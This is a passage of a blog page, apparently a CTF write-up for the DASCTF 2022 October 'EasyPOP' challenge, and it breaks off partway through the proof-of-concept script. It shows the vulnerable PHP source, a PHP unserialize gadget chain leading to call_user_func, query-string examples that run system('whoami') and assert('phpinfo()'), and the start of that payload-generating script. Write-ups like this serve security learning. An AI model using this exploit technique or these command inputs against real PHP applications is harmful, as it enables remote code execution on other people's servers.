@@ -1,0 +1,798 @@
+<!DOCTYPE html>
+<html lang="en-us">
+    <head>
+        <meta charset="utf-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+        <meta name="robots" content="noodp" />
+        <title>DASCTF2022十月赛 - ThnPinkman’s blog</title><meta name="Description" content="只是向上走"><meta property="og:url" content="https://thnpkm.github.io/posts/ctf/dasctf2022%E5%8D%81%E6%9C%88%E8%B5%9B/">
+  <meta property="og:site_name" content="ThnPinkman’s blog">
+  <meta property="og:title" content="DASCTF2022十月赛">
+  <meta property="og:description" content="EasyPOP 源码附上
+&lt;?php highlight_file(__FILE__); error_reporting(0); class fine { private $cmd; private $content; public function __construct($cmd, $content) { $this-&gt;cmd = $cmd; $this-&gt;content = $content; } public function __invoke() { call_user_func($this-&gt;cmd, $this-&gt;content); } public function __wakeup() { $this-&gt;cmd = &#34;&#34;; die(&#34;Go listen to Jay Chou&#39;s secret-code! Really nice&#34;); } } class show { public $ctf; public $time = &#34;Two and a half years&#34;; public function __construct($ctf) { $this-&gt;ctf = $ctf; } public function __toString() { return $this-&gt;ctf-&gt;show(); } public function show(): string { return $this-&gt;ctf .">
+  <meta property="og:locale" content="en_us">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="posts">
+    <meta property="article:published_time" content="2024-08-20T23:51:36+08:00">
+    <meta property="article:modified_time" content="2024-08-20T23:51:36+08:00">
+
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:title" content="DASCTF2022十月赛">
+  <meta name="twitter:description" content="EasyPOP 源码附上
+&lt;?php highlight_file(__FILE__); error_reporting(0); class fine { private $cmd; private $content; public function __construct($cmd, $content) { $this-&gt;cmd = $cmd; $this-&gt;content = $content; } public function __invoke() { call_user_func($this-&gt;cmd, $this-&gt;content); } public function __wakeup() { $this-&gt;cmd = &#34;&#34;; die(&#34;Go listen to Jay Chou&#39;s secret-code! Really nice&#34;); } } class show { public $ctf; public $time = &#34;Two and a half years&#34;; public function __construct($ctf) { $this-&gt;ctf = $ctf; } public function __toString() { return $this-&gt;ctf-&gt;show(); } public function show(): string { return $this-&gt;ctf .">
+<meta name="application-name" content="ThnPinkman&#39;s blog">
+<meta name="apple-mobile-web-app-title" content="ThnPinkman&#39;s blog"><meta name="theme-color" content="#ffffff"><meta name="msapplication-TileColor" content="#da532c"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
+        <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+        <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="manifest" href="/site.webmanifest"><link rel="canonical" href="https://thnpkm.github.io/posts/ctf/dasctf2022%E5%8D%81%E6%9C%88%E8%B5%9B/" /><link rel="prev" href="https://thnpkm.github.io/posts/ctf/dest0g3-520%E8%BF%8E%E6%96%B0%E8%B5%9B/" /><link rel="next" href="https://thnpkm.github.io/posts/ctf/dasctf2022%E4%B9%9D%E6%9C%88%E8%B5%9B/" /><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/normalize.css@8.0.1/normalize.min.css"><link rel="stylesheet" href="/css/style.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.1.1/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/animate.css@4.1.1/animate.min.css"><script type="application/ld+json">
+    {
+        "@context": "http://schema.org",
+        "@type": "BlogPosting",
+        "headline": "DASCTF2022十月赛",
+        "inLanguage": "en-us",
+        "mainEntityOfPage": {
+            "@type": "WebPage",
+            "@id": "https:\/\/thnpkm.github.io\/posts\/ctf\/dasctf2022%E5%8D%81%E6%9C%88%E8%B5%9B\/"
+        },"genre": "posts","keywords": "","wordcount":  1011 ,
+        "url": "https:\/\/thnpkm.github.io\/posts\/ctf\/dasctf2022%E5%8D%81%E6%9C%88%E8%B5%9B\/","datePublished": "2024-08-20T23:51:36+08:00","dateModified": "2024-08-20T23:51:36+08:00","publisher": {
+            "@type": "Organization",
+            "name": "","logo": "https:\/\/thnpkm.github.io\/1651835469576.jpg"},"author": {
+                "@type": "Person",
+                "name": "Author"
+            },"description": ""
+    }
+    </script></head>
+    <body data-header-desktop="fixed" data-header-mobile="auto"><script type="text/javascript">(window.localStorage && localStorage.getItem('theme') ? localStorage.getItem('theme') === 'dark' : ('dark' === 'auto' ? window.matchMedia('(prefers-color-scheme: dark)').matches : 'dark' === 'dark')) && document.body.setAttribute('theme', 'dark');</script>
+
+        <div id="mask"></div><div class="wrapper"><header class="desktop" id="header-desktop">
+    <div class="header-wrapper">
+        <div class="header-title">
+            <a href="/" title="ThnPinkman’s blog"><img
+        class="lazyload logo"
+        src="/svg/loading.min.svg"
+        data-src="https://thnpkm.github.io/1651835469576.jpg"
+        data-srcset="https://thnpkm.github.io/1651835469576.jpg, https://thnpkm.github.io/1651835469576.jpg 1.5x, https://thnpkm.github.io/1651835469576.jpg 2x"
+        data-sizes="auto"
+        alt="https://thnpkm.github.io/1651835469576.jpg"
+        title="https://thnpkm.github.io/1651835469576.jpg" />ThnPinkman&#39;s blog</a>
+        </div>
+        <div class="menu">
+            <div class="menu-inner"><a class="menu-item" href="/posts/"> Posts </a><a class="menu-item" href="/tags/"> Tags </a><a class="menu-item" href="/about/"> About </a><a class="menu-item" href="/categories/"> Categories </a><span class="menu-item delimiter"></span><span class="menu-item search" id="search-desktop">
+                        <input type="text" placeholder="Search titles or contents..." id="search-input-desktop">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-desktop" title="Search">
+                            <i class="fas fa-search fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-desktop" title="Clear">
+                            <i class="fas fa-times-circle fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-desktop">
+                            <i class="fas fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
+                        </span>
+                    </span><a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
+                    <i class="fas fa-adjust fa-fw" aria-hidden="true"></i>
+                </a>
+            </div>
+        </div>
+    </div>
+</header><header class="mobile" id="header-mobile">
+    <div class="header-container">
+        <div class="header-wrapper">
+            <div class="header-title">
+                <a href="/" title="ThnPinkman’s blog"><img
+        class="lazyload logo"
+        src="/svg/loading.min.svg"
+        data-src="https://thnpkm.github.io/1651835469576.jpg"
+        data-srcset="https://thnpkm.github.io/1651835469576.jpg, https://thnpkm.github.io/1651835469576.jpg 1.5x, https://thnpkm.github.io/1651835469576.jpg 2x"
+        data-sizes="auto"
+        alt="https://thnpkm.github.io/1651835469576.jpg"
+        title="https://thnpkm.github.io/1651835469576.jpg" />ThnPinkman&#39;s blog</a>
+            </div>
+            <div class="menu-toggle" id="menu-toggle-mobile">
+                <span></span><span></span><span></span>
+            </div>
+        </div>
+        <div class="menu" id="menu-mobile"><div class="search-wrapper">
+                    <div class="search mobile" id="search-mobile">
+                        <input type="text" placeholder="Search titles or contents..." id="search-input-mobile">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-mobile" title="Search">
+                            <i class="fas fa-search fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-mobile" title="Clear">
+                            <i class="fas fa-times-circle fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-mobile">
+                            <i class="fas fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
+                        </span>
+                    </div>
+                    <a href="javascript:void(0);" class="search-cancel" id="search-cancel-mobile">
+                        Cancel
+                    </a>
+                </div><a class="menu-item" href="/posts/" title="">Posts</a><a class="menu-item" href="/tags/" title="">Tags</a><a class="menu-item" href="/about/" title="">About</a><a class="menu-item" href="/categories/" title="">Categories</a><a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
+                <i class="fas fa-adjust fa-fw" aria-hidden="true"></i>
+            </a></div>
+    </div>
+</header><div class="search-dropdown desktop">
+        <div id="search-dropdown-desktop"></div>
+    </div>
+    <div class="search-dropdown mobile">
+        <div id="search-dropdown-mobile"></div>
+    </div><main class="main">
+                <div class="container"><div class="toc" id="toc-auto">
+            <h2 class="toc-title">Contents</h2>
+            <div class="toc-content" id="toc-content-auto"></div>
+        </div><article class="page single"><h1 class="single-title animate__animated animate__flipInX">DASCTF2022十月赛</h1><div class="post-meta">
+            <div class="post-meta-line"><span class="post-author"><a href="/" title="Author" rel=" author" class="author"><i class="fas fa-user-circle fa-fw" aria-hidden="true"></i>Author</a>
+</span>&nbsp;<span class="post-category">included in <a href="/categories/ctf/"><i class="far fa-folder fa-fw" aria-hidden="true"></i>Ctf</a></span></div>
+            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw" aria-hidden="true"></i>&nbsp;<time datetime="2024-08-20">2024-08-20</time>&nbsp;<i class="fas fa-pencil-alt fa-fw" aria-hidden="true"></i>&nbsp;1011 words&nbsp;
+                <i class="far fa-clock fa-fw" aria-hidden="true"></i>&nbsp;5 minutes&nbsp;</div>
+        </div><div class="details toc" id="toc-static"  data-kept="">
+                <div class="details-summary toc-title">
+                    <span>Contents</span>
+                    <span><i class="details-icon fas fa-angle-right" aria-hidden="true"></i></span>
+                </div>
+                <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
+  <ul>
+    <li><a href="#easypop">EasyPOP</a></li>
+    <li><a href="#hade_waibo">hade_waibo</a></li>
+    <li><a href="#easylove">EasyLove</a></li>
+    <li><a href="#blogsystem">BlogSystem</a></li>
+  </ul>
+</nav></div>
+            </div><div class="content" id="content"><h2 id="easypop">EasyPOP</h2>
+<p>源码附上</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">highlight_file</span>(<span style="color:#66d9ef">__FILE__</span>);
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">error_reporting</span>(<span style="color:#ae81ff">0</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">class</span> <span style="color:#a6e22e">fine</span>
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">private</span> $cmd;
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">private</span> $content;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">function</span> __construct($cmd, $content)
+</span></span><span style="display:flex;"><span>    {
+</span></span><span style="display:flex;"><span>        $this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">cmd</span> <span style="color:#f92672">=</span> $cmd;
+</span></span><span style="display:flex;"><span>        $this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">content</span> <span style="color:#f92672">=</span> $content;
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">function</span> __invoke()
+</span></span><span style="display:flex;"><span>    {
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">call_user_func</span>($this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">cmd</span>, $this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">content</span>);
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">function</span> __wakeup()
+</span></span><span style="display:flex;"><span>    {
+</span></span><span style="display:flex;"><span>        $this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">cmd</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&#34;</span>;
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">die</span>(<span style="color:#e6db74">&#34;Go listen to Jay Chou&#39;s secret-code! Really nice&#34;</span>);
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">class</span> <span style="color:#a6e22e">show</span>
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> $ctf;
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> $time <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;Two and a half years&#34;</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">function</span> __construct($ctf)
+</span></span><span style="display:flex;"><span>    {
+</span></span><span style="display:flex;"><span>        $this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">ctf</span> <span style="color:#f92672">=</span> $ctf;
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">function</span> __toString()
+</span></span><span style="display:flex;"><span>    {
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> $this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">ctf</span><span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">show</span>();
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">show</span>()<span style="color:#f92672">:</span> <span style="color:#a6e22e">string</span>
+</span></span><span style="display:flex;"><span>    {
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> $this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">ctf</span> <span style="color:#f92672">.</span> <span style="color:#e6db74">&#34;: Duration of practice: &#34;</span> <span style="color:#f92672">.</span> $this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">time</span>;
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">class</span> <span style="color:#a6e22e">sorry</span>
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">private</span> $name;
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">private</span> $password;
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> $hint <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;hint is depend on you&#34;</span>;
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> $key;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">function</span> __construct($name, $password)
+</span></span><span style="display:flex;"><span>    {
+</span></span><span style="display:flex;"><span>        $this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">name</span> <span style="color:#f92672">=</span> $name;
+</span></span><span style="display:flex;"><span>        $this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">password</span> <span style="color:#f92672">=</span> $password;
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">function</span> __sleep()
+</span></span><span style="display:flex;"><span>    {
+</span></span><span style="display:flex;"><span>        $this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">hint</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">secret_code</span>();
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">function</span> __get($name)
+</span></span><span style="display:flex;"><span>    {
+</span></span><span style="display:flex;"><span>        $name <span style="color:#f92672">=</span> $this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">key</span>;
+</span></span><span style="display:flex;"><span>        $name();
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">function</span> __destruct()
+</span></span><span style="display:flex;"><span>    {
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> ($this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">password</span> <span style="color:#f92672">==</span> $this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">name</span>) {
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">echo</span> $this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">hint</span>;
+</span></span><span style="display:flex;"><span>        } <span style="color:#66d9ef">else</span> <span style="color:#66d9ef">if</span> ($this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">name</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;jay&#34;</span>) {
+</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">secret_code</span><span style="color:#f92672">::</span><span style="color:#a6e22e">secret</span>();
+</span></span><span style="display:flex;"><span>        } <span style="color:#66d9ef">else</span> {
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">echo</span> <span style="color:#e6db74">&#34;This is our code&#34;</span>;
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">getPassword</span>()
+</span></span><span style="display:flex;"><span>    {
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> $this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">password</span>;
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">setPassword</span>($password)<span style="color:#f92672">:</span> <span style="color:#a6e22e">void</span>
+</span></span><span style="display:flex;"><span>    {
+</span></span><span style="display:flex;"><span>        $this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">password</span> <span style="color:#f92672">=</span> $password;
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">class</span> <span style="color:#a6e22e">secret_code</span>
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">protected</span> $code;
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">static</span> <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">secret</span>()
+</span></span><span style="display:flex;"><span>    {
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">include_once</span> <span style="color:#e6db74">&#34;hint.php&#34;</span>;
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">hint</span>();
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">function</span> __call($name, $arguments)
+</span></span><span style="display:flex;"><span>    {
+</span></span><span style="display:flex;"><span>        $num <span style="color:#f92672">=</span> $name;
+</span></span><span style="display:flex;"><span>        $this<span style="color:#f92672">-&gt;</span>$num();
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">private</span> <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">show</span>()
+</span></span><span style="display:flex;"><span>    {
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> $this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">code</span><span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">secret</span>;
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">isset</span>($_GET[<span style="color:#e6db74">&#39;pop&#39;</span>])) {
+</span></span><span style="display:flex;"><span>    $a <span style="color:#f92672">=</span> <span style="color:#a6e22e">unserialize</span>($_GET[<span style="color:#e6db74">&#39;pop&#39;</span>]);
+</span></span><span style="display:flex;"><span>    $a<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">setPassword</span>(<span style="color:#a6e22e">md5</span>(<span style="color:#a6e22e">mt_rand</span>()));
+</span></span><span style="display:flex;"><span>} <span style="color:#66d9ef">else</span> {
+</span></span><span style="display:flex;"><span>    $a <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">show</span>(<span style="color:#e6db74">&#34;Ctfer&#34;</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">echo</span> $a<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">show</span>();
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>这道题也是唯一写出来的web</p>
+<p>拿到源码就看哪里可以命令执行RCE，看那些php特殊函数，这里的话 就是`call_user_func($this-&gt;cmd, $this-&gt;content);</p>
+<p>具体如何利用是这样的</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span>
+</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">call_user_func</span>($_GET[<span style="color:#e6db74">&#39;a1&#39;</span>],$_GET[<span style="color:#e6db74">&#39;a2&#39;</span>]);
+</span></span><span style="display:flex;"><span>	<span style="color:#75715e">//xxx.php?a1=system&amp;a2=whoami  //命令执行
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	<span style="color:#75715e">///xxx.php?a1=assert&amp;a2=phpinfo()   //代码执行
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#75715e">?&gt;</span><span style="color:#960050;background-color:#1e0010">
+</span></span></span></code></pre></div><p>从而实现RCE</p>
+<p>看源码 有发现一个 hint(); 按理说hint应该是有用的嘛，就想去构造去执行一些hint()函数 ，</p>
+<p>所以要进入secret_code类里面的secret()方法 ，刚开始还想用show()方法去触发secret()</p>
+<p>但其实</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#66d9ef">else</span> <span style="color:#66d9ef">if</span> ($this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">name</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;jay&#34;</span>) {
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">secret_code</span><span style="color:#f92672">::</span><span style="color:#a6e22e">secret</span>();
+</span></span></code></pre></div><p>这里直接触发了secret()</p>
+<p>生成payload要删除__sleep()</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span>$s <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">sorry</span>(<span style="color:#e6db74">&#39;jay&#39;</span>,<span style="color:#e6db74">&#39;123&#39;</span>);
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">echo</span> <span style="color:#a6e22e">serialize</span>($s);
+</span></span></code></pre></div><p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://thnpkm.oss-cn-shanghai.aliyuncs.com/img/202210231356447.png"
+        data-srcset="https://thnpkm.oss-cn-shanghai.aliyuncs.com/img/202210231356447.png, https://thnpkm.oss-cn-shanghai.aliyuncs.com/img/202210231356447.png 1.5x, https://thnpkm.oss-cn-shanghai.aliyuncs.com/img/202210231356447.png 2x"
+        data-sizes="auto"
+        alt="https://thnpkm.oss-cn-shanghai.aliyuncs.com/img/202210231356447.png"
+        title="image-20221023135619813" /></p>
+<p>hint是这个 , 确实没用，因为可以通过call_user_func() 直接rce 去翻文件的</p>
+<p>审计一下可以发现这条链子</p>
+<p><code>sorry:__destruct()-&gt; show:__toString()-&gt; secret_code:call() -&gt;secret_code:show() -&gt;sorry:__get -&gt; fine : __invoke</code></p>
+<p>注意：<code>__call是针对无方法,__get是针对无属性</code></p>
+<p>poc如下</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">class</span> <span style="color:#a6e22e">fine</span>
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">private</span> $cmd;
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">private</span> $content;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">function</span> __construct($cmd, $content)
+</span></span><span style="display:flex;"><span>    {
+</span></span><span style="display:flex;"><span>        $this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">cmd</span> <span style="color:#f92672">=</span> $cmd;
+</span></span><span style="display:flex;"><span>        $this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">content</span> <span style="color:#f92672">=</span> $content;
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">class</span> <span style="color:#a6e22e">show</span>
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> $ctf;
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> $time <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;Two and a half years&#34;</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">function</span> __construct($ctf)
+</span></span><span style="display:flex;"><span>    {
+</span></span><span style="display:flex;"><span>        $this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">ctf</span> <span style="color:#f92672">=</span> $ctf;
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">class</span> <span style="color:#a6e22e">sorry</span>
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">private</span> $name;
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">private</span> $password;
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> $hint;
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> $key;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">function</span> __construct($name, $password,$hint,$key)
+</span></span><span style="display:flex;"><span>    {
+</span></span><span style="display:flex;"><span>        $this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">name</span> <span style="color:#f92672">=</span> $name;
+</span></span><span style="display:flex;"><span>        $this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">password</span> <span style="color:#f92672">=</span> $password;
+</span></span><span style="display:flex;"><span>        $this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">hint</span><span style="color:#f92672">=</span>$hint;
+</span></span><span style="display:flex;"><span>        $this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">key</span><span style="color:#f92672">=</span>$key;
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">class</span> <span style="color:#a6e22e">secret_code</span>
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">protected</span> $code;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">function</span> __construct($code)
+</span></span><span style="display:flex;"><span>    {
+</span></span><span style="display:flex;"><span>        $this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">code</span><span style="color:#f92672">=</span>$code;
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
